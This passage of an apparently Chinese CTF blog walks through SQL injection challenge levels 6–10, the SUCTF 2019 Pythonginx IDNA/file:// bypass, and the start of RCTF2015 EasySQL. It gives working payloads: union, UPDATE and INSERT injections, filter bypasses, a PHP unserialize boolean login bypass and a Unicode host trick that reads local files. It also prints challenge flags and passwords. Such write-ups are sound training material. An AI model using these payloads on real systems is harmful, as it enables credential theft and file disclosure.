src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318172325.png" /></p>
<h2 id="注入过程-5">注入过程</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试字段数：?user=1 order by 5</span><br></pre></td></tr></table></figure>
<p>字段数为5。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试显示位：?user=-1 union select 1,2,3,4,5</span><br></pre></td></tr></table></figure></p>
<p>得到一个很奇怪的结果：<code>User not found</code>，也就是没有显示位，只是返回了user=-1的查询结果。如下payload的结果也是一样：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?user=-1 union select 1,2,3,4,5 from level6_users where status=1</span><br></pre></td></tr></table></figure></p>
<p>接下来就是随便的一些尝试，分别将 <code>admin</code>,
<code>deddlef</code>, <code>username</code>,<code>password</code>
四个关键词分别带入五个位置，基本都是提示： <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318191919.png" /></p>
<p>只有下面的payload有所不同： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?user=-1 union select 1,username,3,4,5 from level6_users where status=1</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318192043.png" /></p>
<h3 id="思路">思路 ⭐</h3>
<p>出现了新的显示。看了大佬的writeup，得到如下思路：</p>
<p>后台进行了二次查询，首先检查 user 参数，如果查询的 user
存在的话，则会返回结果，这个结果有5列，即5个字段。然后再将结果中的第二个字段进行查询，此时得到的结果才会最终显示出来，即上图中的
username和email。因此，真正的注入点是第二个字段。 解释：
<code>user=-1 union select 1,2,3,4,5</code> 返回的结果如下：</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">字段1</th>
<th style="text-align: center;">字段2</th>
<th style="text-align: center;">字段3</th>
<th style="text-align: center;">字段4</th>
<th style="text-align: center;">字段5</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">1</td>
<td style="text-align: center;">2</td>
<td style="text-align: center;">3</td>
<td style="text-align: center;">4</td>
<td style="text-align: center;">5</td>
</tr>
</tbody>
</table>
<p>而<code>user=-1 union select 1,username,3,4,5</code>
返回的结果如下：</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">字段1</th>
<th style="text-align: center;">字段2</th>
<th style="text-align: center;">字段3</th>
<th style="text-align: center;">字段4</th>
<th style="text-align: center;">字段5</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">1</td>
<td style="text-align: center;">username</td>
<td style="text-align: center;">3</td>
<td style="text-align: center;">4</td>
<td style="text-align: center;">5</td>
</tr>
</tbody>
</table>
<p>此时字段2即为注入点，如果直接输入 admin，则会返回admin的信息。</p>
<h3 id="过程">过程</h3>
<p>所以对第二个字段进行注入，根据得到的结果，第二个字段应该是username，然后利用username进行第二次查询数据库，得到信息。</p>
<p>这里有一个细节看：[[SQL注入总结#利用]] <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?user=-1%20union%20select%201,admin&#x27;,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后：?user=-1%20union%20select%201,0x61646d696e27,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line"></span><br><span class="line">?user=-1%20union%20select%201,admin&#x27;#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后：?user=-1%20union%20select%201,0x61646d696e2723,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure></p>
<p>发现前者出现报错，而后者没有报错。说明确实在第二个字段处存在注入，接下来就是常规的注入过程。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 测试字段数：</span><br><span class="line">?user=-1%20union%20select%201,admin&#x27; order by 5#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后:?user=-1%20union%20select%201,0x61646d696e27206f72646572206279203523,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure>
<p>发现显示字段还是5个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2. 测试显示位：</span><br><span class="line">?user=-1%20union%20select%201,&#x27; union select 1,2,3,4,5#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后:?user=-1%20union%20select%201,0x2720756e696f6e2073656c65637420312c322c332c342c3523,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure>
<p>结果如下： <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318194025.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3. 显示用户名和密码</span><br><span class="line">?user=-1%20union%20select%201,&#x27; union select 1,username,3,password,5 from level6_users where status=1#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后:?user=-1%20union%20select%201,0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f7573657273207768657265207374617475733d3123,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure>
<p>成功得到用户名和密码： <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318194406.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 074113b268d87dea21cc839954dec932</span><br><span class="line"></span><br><span class="line">The password for the next level is: shitcoins_are_hold</span><br></pre></td></tr></table></figure>
<h1 id="level-7">Level-7</h1>
<h2 id="题目描述-6">题目描述</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318195333.png" /></p>
<p>题目要求：查询关于google的信息的作者，输入google发现得到一篇文章，但是没有作者。
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318195818.png" /></p>
<h2 id="测试注入点-6">测试注入点</h2>
<p>输入 <code>google'</code> 发现报错信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;%&#x27; OR text.title LIKE &#x27;%google&#x27;%&#x27;)&#x27; at line 1</span><br><span class="line"></span><br><span class="line">SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &#x27;%google&#x27;%&#x27; OR text.title LIKE &#x27;%google&#x27;%&#x27;)</span><br><span class="line"></span><br><span class="line">因此，完整的查询语句如下：SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &#x27;%输入%&#x27; OR text.title LIKE &#x27;%输入%&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>但是 <code>#</code> 、<code>空格</code> 、<code>--+</code>
都被过滤了。但是可以用 <code>%09</code> 和 <code>%a0</code>
代替，不过注意一定要在burpsuite中，不要直接在输入框中输入，否则%号会被再次url编码。其中
<code>%09</code> 为制表符，后者不太懂。</p>
<p>因此： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search=google%&#x27;)--%a0&amp;dosearch=search%21</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318203348.png" /></p>
<h2 id="注入过程-6">注入过程</h2>
<p>获取显示位： 发现 order
by被过滤，不论是大小写、注释都不行。那么直接使用联合查询，如果位数不对也会报错
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search=-1%&#x27;)union select 1,2,3,4--%a0&amp;dosearch=search%21 -&gt; 四个字段</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318203641.png" /></p>
<p>获取作者名字： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search=-1%&#x27;)union select 1,2,3,autor from level7_news--%a0&amp;dosearch=search%21</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318203840.png" /></p>
<p>猜测应该是 <code>TestUserforg00gle</code>，成功。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 970cecc0355ed85306588a1a01db4d80</span><br><span class="line"></span><br><span class="line">The password for the next level is: or_so_i&#x27;m_told</span><br></pre></td></tr></table></figure>
<h1 id="level-8">Level-8</h1>
<h2 id="题目描述-7">题目描述 ⭐</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318204016.png" /></p>
<p>这道题给出的是关于 admin
的信息，还有编辑的按钮。猜测本题应该是关于数据更新的注入，即
<code>update</code> ，前面都是 <code>select</code> 的。</p>
<p><code>update</code> 的语句如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update table_name set column_name1=value1,column_name2=value2,... where column_name3=value;</span><br><span class="line"></span><br><span class="line">前面的column_name是要修改的字段，如果是字符串，则value需要加引号。后面的column_name3是用来找到需要修改的信息。</span><br></pre></td></tr></table></figure></p>
<p>需要注意的是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update table_name set column_name1=value1,column_name2=column_name4,... where column_name3=value;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318210614.png" /></p>
<p>上述语句会将字段4的值赋给字段2，本题应该考察的就是这个。</p>
<h2 id="测试注入点-7">测试注入点</h2>
<p>依次对所有的输入添加单引号，发现只有 Email 报错： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;1&#x27;, age = &#x27;1&#x27; WHERE id = 1&#x27; at line 3</span><br></pre></td></tr></table></figure></p>
<p>如果payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email=1&#x27;&amp;name=abc&amp;icq=12345&amp;age=90&amp;edit=Edit</span><br></pre></td></tr></table></figure></p>
<p>报错信息为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;12345&#x27;,age = &#x27;90&#x27; WHERE id = 1&#x27; at line 3</span><br></pre></td></tr></table></figure></p>
<p>可以看到，被影响的只有 icq 和 age，而 name
没被影响，推测后台语句如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update tableName set name=&#x27;[input]&#x27;,emai=&#x27;[input]&#x27;,icq=&#x27;[input]&#x27;,age=&#x27;[input]&#x27; where id=1;</span><br></pre></td></tr></table></figure></p>
<h2 id="注入过程-7">注入过程</h2>
<p>上述可知，我们需要将密码的值赋给4个字段中的其中一个，有两种情况： -
icq和age其中一个</p>
<p>有一个问题，这两个字段都在email的后面，要想赋值给这两个其中之一，需要在email中写完之后，将后面的所有语句注释掉。即：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email=1&#x27;,icq=password,age=&#x27;23&#x27; where id=1;#</span><br><span class="line"></span><br><span class="line">真正查询语句为：update tableName set name=&#x27;[input]&#x27;,emai=&#x27;1&#x27;,icq=password,age=&#x27;23&#x27; where id=1;#&#x27;,icq=&#x27;[input]&#x27;,age=&#x27;[input]&#x27; where id=1;</span><br></pre></td></tr></table></figure></p>
<p>测试发现这种做法不行。报错信息为：<code>near 'icq = '12345',age = '90' WHERE id = 1'</code>。</p>
<ul>
<li>email和name其中一个</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">根据报错信息：12345&#x27;,age = &#x27;90&#x27; WHERE id = 1，需要将 icq=&#x27; 补齐</span><br><span class="line">1. email=&#x27;,email=password,icq=&#x27;</span><br><span class="line">2. email=1&#x27;,name=password,icq=&#x27;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318212222.png" /></p>
<p>成功得到密码。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 9ea04c5d4f90dae92c396cf7a6787715  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: network_pancakes_milk_and_wine</span><br></pre></td></tr></table></figure></p>
<h3 id="疑惑点">疑惑点 ⭐</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. email=&#x27;</span><br><span class="line">2. email=&#x27;#</span><br></pre></td></tr></table></figure>
<p>报错信息分别为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 12345&#x27; balabala</span><br><span class="line">2. icq=&#x27;12345&#x27; balabala</span><br></pre></td></tr></table></figure></p>
<p>也就是注释符只注释了email=’‘ 中后面的单引号。前者为
<code>(email='')(',icq=')12345'</code>，括号只是为了方便看。而后者为
<code>(email='')#',icq='12345'</code>，按道理后面的都应该被注释掉了，我的猜测如下（本人php代码差，如果有误请多多批评）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update tableName set name=&#x27;[input]&#x27;,</span><br><span class="line">emai=&#x27;[input]&#x27;,</span><br><span class="line">icq=&#x27;[input]&#x27;,</span><br><span class="line">age=&#x27;[input]&#x27; where id=1;</span><br></pre></td></tr></table></figure>
<p>这样子注释符就只会注释掉email那行最后面的单引号和逗号，从而报错信息变为
<code>icq='12345' balabala</code>。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318213900.png" /></p>
<p>图上报错信息中的换行符也应证了我的猜想。</p>
<h1 id="level-9">Level-9</h1>
<h2 id="题目描述-8">题目描述</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318213950.png" /></p>
<p>在输入框填入东西后，提交查询，发现多了信息： <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318214029.png" /></p>
<p>因此猜测后台使用的语句是 <code>insert into</code>。</p>
<p><code>inser into</code> 语句格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO 表名称 VALUES (值1, 值2,....)</span><br><span class="line">指定所要插入数据的列:</span><br><span class="line">INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)</span><br><span class="line">一次性添加多个：（注意，如果有主键，主键必须不同）</span><br><span class="line">INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....),(值1, 值2,....),(值1, 值2,....),...</span><br></pre></td></tr></table></figure>
<h2 id="测试注入点-8">测试注入点</h2>
<p>依次对三个输入框添加单引号，发现
<code>autor=1&amp;title=1&amp;text=1'</code> 时出现报错信息： <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318214508.png" /></p>
<p>单独将重要信息提取：<code>'1'')</code>，可以猜测后台语句为：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO level9_users (autor,title,text) VALUES (&#x27;input&#x27;,&#x27;input&#x27;,&#x27;input&#x27;);</span><br></pre></td></tr></table></figure></p>
<p>输入 <code>autor=1&amp;title=1&amp;text=1')#</code>
发现页面正常，验证了猜测。</p>
<h2 id="注入过程-8">注入过程</h2>
<p>利用一次性添加多个。</p>
<p>构造如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">autor=1&amp;title=1&amp;text=1&#x27;),((select username from level9_users limit 0,1),(select password from level9_users limit 0,1),&#x27;456</span><br></pre></td></tr></table></figure></p>
<p>带入后为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO level9_users (autor,title,text) VALUES (&#x27;input&#x27;,&#x27;input&#x27;,&#x27;1&#x27;),((select username from level9_users limit 0,1),(select password from level9_users limit 0,1),&#x27;456&#x27;);</span><br></pre></td></tr></table></figure></p>
<p>正好将 username 和 password 作为 autor 和 title 显示出来。 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220051.png" /></p>
<p>成功登录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 84ec870f1ac294508400e30d8a26a679</span><br><span class="line"></span><br><span class="line">The password for the next level is: whatever_just_a_fresh_password</span><br></pre></td></tr></table></figure>
<h1 id="level-10">Level-10 ⭐</h1>
<h2 id="题目描述-9">题目描述</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220508.png" /></p>
<p>点击 login 发现： <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220532.png" /></p>
<p>也就是这里需要垂直提权。</p>
<h2 id="测试注入点-9">测试注入点</h2>
<p>由于没有多余的信息，并且url也不存在注入点，所以抓包看看： <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220631.png" /></p>
<p>一般垂直提权都是看cookie，但是这里cookie的信息是登录每道题的，所以应该是post中的
<code>login</code>。将上面的字符串base64解码后得到： <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220733.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:6:&quot;Monkey&quot;;s:8:&quot;password&quot;;s:12:&quot;0815password&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>这里应该需要修改username和password的值，也就是第2和第4的内容。</p>
<p>经过多次测试，还是毫无发现。就去看了下大佬的writeup，根据推测，后台语句为：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$input</span> = unserialize(base64_encode(<span class="variable">$POST</span>[<span class="string">&quot;login&quot;</span>]));</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$input</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$input</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from users where username=<span class="subst">$username</span> and password=<span class="subst">$password</span>&quot;</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>用户名为：<code>TheMaster</code>。密码不知道，所以 password
即为注入点。</p>
<h2 id="注入过程-9">注入过程</h2>
<p>本题要想成功登录，就得 where
后面的语句为真，即<code>username=$username</code>和<code>password=$password</code>同时为真。前者简单，后者可以这么操作，即<code>password=true</code>，这样子就能绕过where的判断。</p>
<p>因此最后的payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:9:&quot;TheMaster&quot;;s:8:&quot;password&quot;;b:1;&#125; </span><br><span class="line">解释：bool型的就是b，且true为1，false为0</span><br></pre></td></tr></table></figure></p>
<p>经过base64编码后带入即可成功登录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 721ce43d433ad85bcfa56644b112fa52  </span><br><span class="line"></span><br><span class="line">The password for the hall of fame is: make_the_internet_great_again</span><br></pre></td></tr></table></figure>
<h1 id="总结">总结</h1>
<p>经过这十道题，发现sql注入不仅仅是常规类型的考察，还有不同语句，如：update，insert
into等。有时候还要猜测后台语句的写法，或者像
Level-6一样，注入语句中返回的结果作为输入二次查询，还得明白常见的后台判断。总之，收获良多，是很好的题目。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>SUCTF 2019 Pythonginx</title>
    <url>/2022/04/16/SUCTF%202019%20Pythonginx/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BSUCTF%202019%5DPythonginx">Pythonginx</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境之后，直接给了代码，不过格式很乱，查看页面源码可以得到整齐的代码
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname <span class="comment"># 提取url中的hostname</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:  <span class="comment"># 绕过1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url)) <span class="comment"># 将url分割</span></span><br><span class="line">    host = parts[<span class="number">1</span>] <span class="comment"># 取其中的第二个其实和</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: <span class="comment"># 绕过2</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>): <span class="comment"># 将parts[1]以 . 分割</span></span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    </span><br><span class="line">    到此为止，还是parts[<span class="number">1</span>]得到的是国际标准化的hostname</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()  <span class="comment"># get flag</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span></span><br><span class="line">    &lt;/code&gt;</span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure></p>
<h1 id="前置知识">前置知识</h1>
<h2 id="相关函数问题">相关函数问题</h2>
<p>参考连接：</p>
<ul>
<li>https://docs.python.org/zh-cn/3/library/urllib.parse.html</li>
<li><a
href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">INDA</a></li>
</ul>
<p><code>urlparse(url)</code>作用：将url字符串分割成多个部分，下面是官网给的例子
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">&#x27;//www.cwi.nl:80/%7Eguido/Python.html&#x27;</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">&#x27;&#x27;</span>, netloc=<span class="string">&#x27;www.cwi.nl:80&#x27;</span>, path=<span class="string">&#x27;/%7Eguido/Python.html&#x27;</span>,</span><br><span class="line">            params=<span class="string">&#x27;&#x27;</span>, query=<span class="string">&#x27;&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">&#x27;www.cwi.nl/%7Eguido/Python.html&#x27;</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">&#x27;&#x27;</span>, netloc=<span class="string">&#x27;&#x27;</span>, path=<span class="string">&#x27;www.cwi.nl/%7Eguido/Python.html&#x27;</span>,</span><br><span class="line">            params=<span class="string">&#x27;&#x27;</span>, query=<span class="string">&#x27;&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse(<span class="string">&#x27;help/Python.html&#x27;</span>)</span><br><span class="line">ParseResult(scheme=<span class="string">&#x27;&#x27;</span>, netloc=<span class="string">&#x27;&#x27;</span>, path=<span class="string">&#x27;help/Python.html&#x27;</span>, params=<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            query=<span class="string">&#x27;&#x27;</span>, fragment=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<p>除了这些部分之外，还有一些属性（详细的可以看官网），其中就有<code>hostname</code>。不严谨的解释：
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://abc.cde.com/index.php?name=hello&#x27;</span></span><br><span class="line"></span><br><span class="line">其中hostname就是abc.cde.com，即http://之后，/index.php之前的部分都是</span><br></pre></td></tr></table></figure></p>
<p><code>urlsplit(url)</code>作用：将url字符串分割成多个部分，大致上与<code>urlparse(url)</code>一样。</p>
<p><code>urlunsplit(parts)</code>作用：与<code>urlsplit()</code>函数相反，这是将多个部分拼接成一个url。</p>
<p><code>h.encode('idna')</code>作用：将h进行inda编码。idna简单来说就是为了统一不同国家见的特殊字符的域名而设计出来的一种编码，说白了就是把其他语言及其特殊字符转换成英文即国际符号。</p>
<h2 id="ngnix">Ngnix</h2>
<p>ngnix的配置文件地址是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>/usr/local下的才是正在使用的配置文件，/etc/nginx那个只是默认的配置</p>
</blockquote>
<h1 id="解题">解题</h1>
<p>分析代码得到有用的信息： -
利用<code>return urllib.request.urlopen(finalUrl).read()</code>get
flag，因此使用伪协议file读取； -
根据提示，域名为<code>suctf.cc</code>，且跟ngnix有关系。所以，尝试先读取ngnix的配置文件<code>file://suctf.cc/usr/local/nginx/conf/nginx.conf</code>；
-
域名不能直接为<code>suctf.cc</code>，经过<code>h.encode('idna').decode('utf-8')</code>之后才为<code>suctf.cc</code>。这样才可以绕过前两个if判断；</p>
<p>根据idna编码规则，去<a
href="https://www.compart.com/en/unicode">compart</a>，搜索相关的字符，在搜索框输入<code>/</code>时找到了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416225726.png" /></p>
<p>因此，构造payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://suctf.c℆sr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></p>
<p>解释：此时的hostname为<code>suctf.c℆sr</code>，但是无法被被识别，所以两次的<code>host=='suctf.cc'</code>都被成功绕过。而当执行到<code>newhost.append(h.encode('idna').decode('utf-8'))</code>时，<code>c℆sr</code>变成<code>cc/usr</code>，然后在经过<code>parts[1] = '.'.join(newhost)</code>拼接，得到<code>suctf.cc/usr</code>，最后<code>finalUrl = urlunsplit(parts).split(' ')[0]</code>得到完成的url：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://suctf.cc/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></p>
<p>结果如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416230456.png" /></p>
<p>找到了flag文件的位置，接下来构造如下payload，最终得到flag
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file://suctf.c℆sr/fffffflag</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416230602.png" /></p>
<h1 id="总结">总结</h1>
<p>我认为本题考察的<code>idna</code>编码确实比较少见，我个人分析代码得到了需要利用某种编码方式绕过前两次if，然后经过<code>idna</code>编码再得到正确的域名，但是找不到可用的字符，经过查看大佬的writeup之后才找到。</p>
<p>大佬writeup</p>
<ul>
<li>https://mashiro01.github.io/writeup/SUCTF_2019.html</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>IDNA编码</tag>
      </tags>
  </entry>
  <entry>
    <title>RCTF2015 EasySQL</title>
    <url>/2022/05/19/RCTF2015%20EasySQL/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BRCTF2015%5DEasySQL">Easy
SQL</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519220501.png" /></p>
<p>在登陆界面测试了一下，没有存在SQL注入。于是注册一个账号查看以下功能点。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519220600.png" /></p>
<p>这四个蓝色的都测试了一下，下面三个的url虽然有title=，但是没有注入点。</p>
<p>因此，注入点应该就是在 change password
里面，也就是可能存在二次注入</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519220746.png" /></p>
<p>因此，去外面尝试注册带有不同字符的用户（密码也可以尝试下），尝试到双引号的时候出现了报错：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220519221214.png" /></p>
<h1 id="解题">2. 解题</h1>
<p>先fuzz以下，看一下过滤了什么，经测试，过滤了空格以及字符串截取函数（划重点）。因此使用报错注入。</p>
